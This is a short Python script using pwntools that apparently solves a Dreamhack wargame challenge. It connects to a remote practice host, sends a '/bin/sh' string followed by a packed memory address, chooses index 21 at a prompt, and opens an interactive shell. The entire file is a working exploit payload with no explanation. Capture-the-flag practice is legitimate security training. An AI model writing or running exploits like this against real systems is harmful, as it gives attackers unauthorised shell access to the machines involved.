from pwn import *

port = 20015
rem = remote("host3.dreamhack.games", port)

payload = b"/bin/sh\x00" + p32(0x804a0ac)
rem.sendafter(b"name: ", payload)
rem.recvuntil(b'want?: ')
rem.sendline(b'21')

rem.interactive()